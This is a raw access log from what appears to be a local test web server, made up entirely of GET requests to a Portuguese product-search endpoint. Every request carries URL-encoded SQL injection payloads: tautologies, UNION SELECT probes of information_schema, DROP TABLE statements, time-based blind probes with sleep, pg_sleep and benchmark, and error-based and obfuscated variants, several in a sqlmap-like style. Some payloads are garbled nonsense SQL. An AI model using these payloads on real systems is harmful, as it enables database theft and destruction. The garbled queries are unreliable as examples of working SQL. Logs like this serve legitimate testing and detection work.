Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/busca/?nome=1%25%27+%29+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28+chr+%28+113+%29+%7C%7Cchr+%28&categoria=1%25%27+%29+and+2853+%3D+cast+%28+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%29+%7C%7C+%28+select+%28+case+when+%28+2853+%3D+2853+%29+then+1+else+0+end+%29+%29+%3A%3Atext%7C%7C+%28+chr+%28+113+%29+%7C%7Cchr+%28 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23+--&categoria=%27+OR+%271%27%3D%271%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271&categoria=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calve_tume_name%27%29+from+information_schema.tables%3B+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Calve_tume_name%27%29+from+information_schema.tables%3B+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial+lyve+File%27+%3D+%27i%27&categoria=%27+UNION+SELECT+%28+table_samerial+lyve+File%27+%3D+%27i%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_sccamedoze+%3B+and+%29+%25%27%2B%27&categoria=%27+UNION+SELECT+table_sccamedoze+%3B+and+%29+%25%27%2B%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28%29+%2C+and+%27exca%27+like+%27eena&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%28%29+%2C+and+%27exca%27+like+%27eena HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%3Bwhere+dam%3B+File+s+the+4+%24+As&categoria=%27+UNION+SELECT+%40+%2C+users%3Bwhere+dam%3B+File+s+the+4+%24+As HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2Cubecamene+the+Faleca&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2Cubecamene+the+Faleca HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschame+cannore+veranly+gereat_regi&categoria=%27+UNION+SELECT+%40+%2C+userschame+cannore+veranly+gereat_regi HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschamelace+%28+trom_unat%29&categoria=%27+UNION+SELECT+%40+%2C+userschamelace+%28+trom_unat%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27i%27+%3D+%27i&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynot%27%2C+%29+%3Ewat%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynot%27%2C+%29+%3Ewat%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+t%29+%24%3D+%27S%27+OR+%274%27%3C%27%3D%272%27%23%27+AND+True+AND+%22%3FV%22%3D%22V%3B%22+--+1%27&categoria=%27+UNION+SELECT+%40%40verscomand+t%29+%24%3D+%27S%27+OR+%274%27%3C%27%3D%272%27%23%27+AND+True+AND+%22%3FV%22%3D%22V%3B%22+--+1%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_caler%27%2C+DaEnDeR%27+%3D+%28SeLEcT+%28SelECt+%28SELECT+1%29%29%29%2C%28sElECT+0x0%29+%29&categoria=%27+UNION+SELECT+table_caler%27%2C+DaEnDeR%27+%3D+%28SeLEcT+%28SelECt+%28SELECT+1%29%29%29%2C%28sElECT+0x0%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Cnublec+name+and+21311001%2C1%2C1%2C1%23&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Cnublec+name+and+21311001%2C1%2C1%2C1%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale_tember%27%29&categoria=%27+UNION+SELECT+%40+verale_tember%27%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+verale+%29+--&categoria=%27+UNION+SELECT+%40+verale+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_NiBL%2C+SiNCh%2C+%40%40VersIon+%29+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cname_NiBL%2C+SiNCh%2C+%40%40VersIon+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+_%28+%2Cull%2Cfuln%29%2C+game_rectaliling+from+table_tame&categoria=%27+UNION+SELECT+_%28+%2Cull%2Cfuln%29%2C+game_rectaliling+from+table_tame HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentytel+%29+%27atex%27+%29+%27ing%27%2Cselect+%28+case+in+%28+13+%29+%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentytel+%29+%27atex%27+%29+%27ing%27%2Cselect+%28+case+in+%28+13+%29+%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+1%2Ccall_weme_%2F%2A%2A%2F+%29+%2F%2A%2A%2F+%29&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%28+1%2Ccall_weme_%2F%2A%2A%2F+%29+%2F%2A%2A%2F+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Cly%2C+%29+%27%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24%3B%2Cly%2C+%29+%27%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+and+%27vevite+like+%27vejt%27+like+%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+and+%27vevite+like+%27vejt%27+like+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_name%27+%29+--&categoria=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+-+--&categoria=%27+UNION+SELECT+-+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatebemale_sate_qelse+Nule+%29+%3B+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmatebemale_sate_qelse+Nule+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28crumelyt%29all+%29+%29+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28crumelyt%29all+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C%27%29+%3E+1%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C%27%29+%3E+1%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3D+1067&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3D+1067 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+SELECT+vErsion+%28+%29+%2C+Rownum_and+1%2Cversion+%28+%29+--+1&categoria=%27+UNION+SELECT+%28+%2C+SELECT+vErsion+%28+%29+%2C+Rownum_and+1%2Cversion+%28+%29+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+1+--&categoria=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+%29+--&categoria=%27%3B+DROP+TABLE+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SET+--&categoria=%27%3B+DROP+TABLE+SET+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%23%22%3B+OR+%28SELECT+%28SELECT+%28SELECT+0%29%29%29+%3D+0x1+OR+False+--+1&categoria=%22+OR+%221%22%3D%221%23%22%3B+OR+%28SELECT+%28SELECT+%28SELECT+0%29%29%29+%3D+0x1+OR+False+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+as+mxxd+where+7255+%3D+7255+or+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+sddo+%29+%23+--&categoria=1%22+%29+%29+as+mxxd+where+7255+%3D+7255+or+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+sddo+%29+%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-5738%22+%29+as+efbn+where+8541+%3D+8541+union+all+select+8541%2C8541%2C8541%2C8541%2C8541%2C8541%2C8541%2C8541%23&categoria=-5738%22+%29+as+efbn+where+8541+%3D+8541+union+all+select+8541%2C8541%2C8541%2C8541%2C8541%2C8541%2C8541%2C8541%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+1%23%22.+%3D+1+union+select+1%2Cversion+%28+%29+--+1&categoria=select+%2A+from+users+where+id+%3D+1+or+1%23%22.+%3D+1+union+select+1%2Cversion+%28+%29+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%5C%60%2C%2Fm%2A%2C%7B%2C%3C%5D%5E%40-%21e-%26yb-c1-5ew%2Bz%5Ce%3B%3Ch5+~l4%3C%3C0440or1%27+where+1895+%3D+1895+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+--&categoria=%5C%60%2C%2Fm%2A%2C%7B%2C%3C%5D%5E%40-%21e-%26yb-c1-5ew%2Bz%5Ce%3B%3Ch5+~l4%3C%3C0440or1%27+where+1895+%3D+1895+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+where+3018+%3D+3018+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+--&categoria=1%22+where+3018+%3D+3018+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%28+%28+%28+%22%25%22+%3D+%22&categoria=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%28+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%28+%27eihl%27+%3D+%27eihl+--&categoria=1%27+%29+%29+%29+and+6969+%3D+%28+select+6969+from+pg_sleep+%28+5+%29+%29+and+%28+%28+%28+%27eihl%27+%3D+%27eihl+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+mzby+where+6530+%3D+6530&categoria=1%27+%29+as+mzby+where+6530+%3D+6530 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27xbyn%27+where+6881+%3D+6881&categoria=1%27%2B+%28+select+%27xbyn%27+where+6881+%3D+6881 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+as+eefe+where+5290+%3D+5290+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+gcrr+%29+%23&categoria=1%22+%29+as+eefe+where+5290+%3D+5290+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+gcrr+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%2C-r201-e76%5B+%3Dex%7C9-%25%2F%28oun4%3Dnsa+n3a3%5E7wd%29v%3Cbco%3C%24d%2Av%217%3F5h-9h6%40p%29s%23%5Eg%5C5%60%29%3Fu%40%7B~%2A_z%7D%3Aj%7B%3B%60yv%3Am%3Aw%3D-sj%23y%5D4s%5Cx%7B690%3Av-pda%5C5%21w%5C%23-%3Ar%2C84%5D%5C0%5C%5Cbw74%40m%7C%3A9xk1%5B%25n%23f2~~wcm60%3D0%3D-w9z3q65j%2Fc~t6%3B%28r8b%2A%5C%3E%21jaa6so%5E%60%7D_%40e0jx3qq%3Agz%5E%5B%3A%3Eoiyek%29c1%27+%29+as+eymt+where+3911+%3D+3911+or+4411+%3D+%28&categoria=%2C-r201-e76%5B+%3Dex%7C9-%25%2F%28oun4%3Dnsa+n3a3%5E7wd%29v%3Cbco%3C%24d%2Av%217%3F5h-9h6%40p%29s%23%5Eg%5C5%60%29%3Fu%40%7B~%2A_z%7D%3Aj%7B%3B%60yv%3Am%3Aw%3D-sj%23y%5D4s%5Cx%7B690%3Av-pda%5C5%21w%5C%23-%3Ar%2C84%5D%5C0%5C%5Cbw74%40m%7C%3A9xk1%5B%25n%23f2~~wcm60%3D0%3D-w9z3q65j%2Fc~t6%3B%28r8b%2A%5C%3E%21jaa6so%5E%60%7D_%40e0jx3qq%3Agz%5E%5B%3A%3Eoiyek%29c1%27+%29+as+eymt+where+3911+%3D+3911+or+4411+%3D+%28 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+where+4878+%3D+4878+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+--&categoria=1%22+%29+where+4878+%3D+4878+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+and+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8190+%3D+8190%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29&categoria=1%27+and+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8190+%3D+8190%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+rnfb+where+2405+%3D+2405+or+8514+%3D+benchmark+%28+5000000%2Cmd5+%28+0x544d5a4c+%29+%29+%23&categoria=1+%29+as+rnfb+where+2405+%3D+2405+or+8514+%3D+benchmark+%28+5000000%2Cmd5+%28+0x544d5a4c+%29+%29+%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+as+pghp+where+9086+%3D+9086&categoria=1%27+%29+as+pghp+where+9086+%3D+9086 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-8203%22+%29+union+all+select+6394%2C6394%2C6394%2C6394%2C6394+--&categoria=-8203%22+%29+union+all+select+6394%2C6394%2C6394%2C6394%2C6394+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+3715+in+%28+%28+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122+%29+%2Bchar+%28+118+%29+%2Bchar+%28+122+%29+%2Bchar+%28&categoria=1%27+%29+%29+%29+and+3715+in+%28+%28+char+%28+113+%29+%2Bchar+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+char+%28+48+%29+end+%29+%29+%2Bchar+%28+113+%29+%2Bchar+%28+122+%29+%2Bchar+%28+118+%29+%2Bchar+%28+122+%29+%2Bchar+%28 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+wqhm+where+9871+%3D+9871&categoria=1%27+%29+%29+as+wqhm+where+9871+%3D+9871 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+%29+as+xebl+where+3105+%3D+3105+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+--&categoria=1+%29+%29+as+xebl+where+3105+%3D+3105+or+8421+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-9197%27+%29+or+%28+6877+%3D+8010+%29+%2A8010+and+%28+%27umwl%27+%3D+%27umwl&categoria=-9197%27+%29+or+%28+6877+%3D+8010+%29+%2A8010+and+%28+%27umwl%27+%3D+%27umwl HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+as+hoiv+where+9708+%3D+9708+and+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8190+%3D+8190%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29+--&categoria=1%22+%29+as+hoiv+where+9708+%3D+9708+and+exp+%28+~+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+8190+%3D+8190%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+x+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+as+tley+where+3539+%3D+3539&categoria=1%27+%29+%29+as+tley+where+3539+%3D+3539 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+where+8536+%3D+8536&categoria=1+where+8536+%3D+8536 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2795%27+%29+or+9723+%3D+9427%23+--&categoria=-2795%27+%29+or+9723+%3D+9427%23+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+%29+%29+%29+and+6510+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%28+%28+%22agaz%22+%3D+%22agaz&categoria=1%22+%29+%29+%29+and+6510+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+and+%28+%28+%28+%22agaz%22+%3D+%22agaz HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%22+%29+%29+%29+and+8407+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+and+%28+%28+%28+%22%25%22+%3D+%22&categoria=1%25%22+%29+%29+%29+and+8407+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+and+%28+%28+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+and+2716+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+--&categoria=1%27+%29+%29+and+2716+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22.%3B%22+or+1+%3D+1+--+1&categoria=select+%2A+from+users+where+id+%3D+1+or+%22.%3B%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+and+%28+%27nlfl%27+like+%27nlfl&categoria=1%27+%29+or+%28+select+9173+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9173+%3D+9173%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+and+%28+%27nlfl%27+like+%27nlfl HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=0O0o0o0B0B0b1101000O0o0O127120100115o0x0o0O0o0x0X0o0o0b0O0B0o0o0o112550x0o2o3O0o0o5o0O5o0o0b100010111511%25%22.uniON+all%5EsElECT~nuLl%2CnulL%2CNuLl%2Cnull%2CnULl%2CnuLl%2Cnull%2CNulL%2CnuLl+--&categoria=0O0o0o0B0B0b1101000O0o0O127120100115o0x0o0O0o0x0X0o0o0b0O0B0o0o0o112550x0o2o3O0o0o5o0O5o0o0b100010111511%25%22.uniON+all%5EsElECT~nuLl%2CnulL%2CNuLl%2Cnull%2CnULl%2CnuLl%2Cnull%2CNulL%2CnuLl+-- HTTP/1.1
